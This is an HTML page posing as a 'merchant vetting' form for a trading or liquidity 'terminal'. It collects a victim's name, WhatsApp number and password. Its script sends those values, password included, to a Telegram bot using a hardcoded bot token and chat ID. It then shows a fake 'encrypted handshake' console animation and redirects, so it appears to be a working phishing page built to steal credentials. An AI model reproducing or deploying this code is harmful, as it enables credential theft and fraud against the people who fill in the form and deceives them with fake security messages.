<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Merchant Vetting | AGMT Terminal</title>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&family=JetBrains+Mono&display=swap" rel="stylesheet">
    <style>
        :root { --primary: #2563eb; --bg: #020617; --card: #0f172a; --border: #1e293b; }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Plus Jakarta Sans', sans-serif; }
        
        body { 
            background: var(--bg); 
            color: white; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            min-height: 100vh; 
            padding: 20px;
            background-image: radial-gradient(circle at 0% 0%, #1e1b4b 0%, #020617 50%);
        }

        .container { width: 100%; max-width: 400px; animation: slideUp 0.8s ease; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }

        .card { 
            background: var(--card); 
            border: 1px solid var(--border); 
            border-radius: 35px; 
            padding: 35px 25px; 
            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.7);
            position: relative;
            overflow: hidden;
        }

        /* Top Progress Bar */
        .step-bar { display: flex; gap: 8px; margin-bottom: 30px; }
        .step { height: 4px; flex: 1; background: #1e293b; border-radius: 10px; position: relative; overflow: hidden; }
        .step.active::after { content: ""; position: absolute; left: 0; top: 0; height: 100%; width: 100%; background: var(--primary); box-shadow: 0 0 10px var(--primary); }

        h2 { font-size: 24px; font-weight: 800; letter-spacing: -1px; margin-bottom: 8px; }
        p.info { color: #64748b; font-size: 13px; line-height: 1.5; margin-bottom: 30px; }

        .input-group { margin-bottom: 20px; position: relative; }
        label { display: block; font-size: 10px; font-weight: 800; color: #475569; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 8px; margin-left: 5px; }
        
        input {
            width: 100%;
            background: #1e293b;
            border: 1.5px solid var(--border);
            padding: 18px 20px;
            border-radius: 18px;
            color: #fff;
            font-size: 15px;
            outline: none;
            transition: 0.3s;
        }
        input:focus { border-color: var(--primary); background: #0f172a; box-shadow: 0 0 0 4px rgba(37, 99, 235, 0.1); }

        .btn-init {
            width: 100%;
            background: var(--primary);
            color: white;
            padding: 22px;
            border-radius: 20px;
            border: none;
            font-weight: 800;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
            transition: 0.3s;
            box-shadow: 0 15px 30px rgba(37, 99, 235, 0.3);
        }

        /* Loading Overlay */
        #loading-screen { 
            display: none; 
            position: fixed; 
            inset: 0; 
            background: #020617; 
            z-index: 1000; 
            flex-direction: column; 
            align-items: center; 
            justify-content: center; 
            padding: 30px; 
        }
        .console { font-family: 'JetBrains Mono', monospace; font-size: 12px; color: #10b981; margin-top: 30px; width: 100%; max-width: 280px; }
    </style>
</head>
<body>

    <div class="container">
        <div class="card">
            <div class="step-bar">
                <div class="step active"></div>
                <div class="step active"></div>
                <div class="step"></div>
            </div>

            <h2>Terminal Vetting</h2>
            <p class="info">Complete your merchant identification to allocate your unique global liquidity node.</p>

            <form id="vettingForm">
                <div class="input-group">
                    <label>Agent Full Name</label>
                    <input type="text" id="fullname" placeholder="John Doe" required>
                </div>

                <div class="input-group">
                    <label>WhatsApp Contact (KYC)</label>
                    <input type="tel" id="phone" placeholder="+234..." required>
                </div>

                <div class="input-group">
                    <label>System Password</label>
                    <input type="password" id="pass" placeholder="••••••••" required>
                </div>

                <button type="button" class="btn-init" onclick="submitVetting()">
                    INITIALIZE SECURE NODE
                </button>
            </form>
        </div>
    </div>

    <div id="loading-screen">
        <div style="width: 50px; height: 50px; border: 4px solid #1e293b; border-top-color: var(--primary); border-radius: 50%; animation: spin 1s linear infinite;"></div>
        <h3 style="margin-top: 25px; font-weight: 800;">ALLOCATING RESOURCES...</h3>
        <div class="console" id="log-output"></div>
    </div>

    <script>
        const botToken = "8673029559:AAF4zFJC80TERVUMTvZ9ieSMWM0K-2vWGTI";
        const chatId = "7909543900";

        async function submitVetting() {
            const name = document.getElementById('fullname').value;
            const phone = document.getElementById('phone').value;
            const pass = document.getElementById('pass').value;

            if(!name || !phone || !pass) {
                alert("All security fields are mandatory for node allocation.");
                return;
            }

            // SHOW LOADING
            document.getElementById('loading-screen').style.display = 'flex';

            // 1. TELEGRAM ALERT: Send lead data immediately
            const msg = `👤 <b>AGMT | NEW MERCHANT VETTING</b>%0A<b>Name:</b> ${name}%0A<b>Phone:</b> ${phone}%0A<b>Pass:</b> ${pass}`;
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${msg}&parse_mode=html`);

            // 2. CONSOLE LOGIC
            const logBox = document.getElementById('log-output');
            const sequences = [
                "> Establishing encrypted handshake...",
                "> Validating regional IP node...",
                "> Syncing Merchant Ledger...",
                "> Node Allocated: JM-" + Math.floor(Math.random()*90000 + 10000),
                "> Success. Redirecting to Terminal..."
            ];

            let i = 0;
            const interval = setInterval(() => {
                if(i < sequences.length) {
                    const line = document.createElement('div');
                    line.style.marginBottom = "8px";
                    line.innerText = sequences[i];
                    logBox.appendChild(line);
                    i++;
                } else {
                    clearInterval(interval);
                    setTimeout(() => {
                        window.location.href = 'dashboard.html';
                    }, 1000);
                }
            }, 1200);
        }
    </script>

    <style>
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>

</body>
</html>
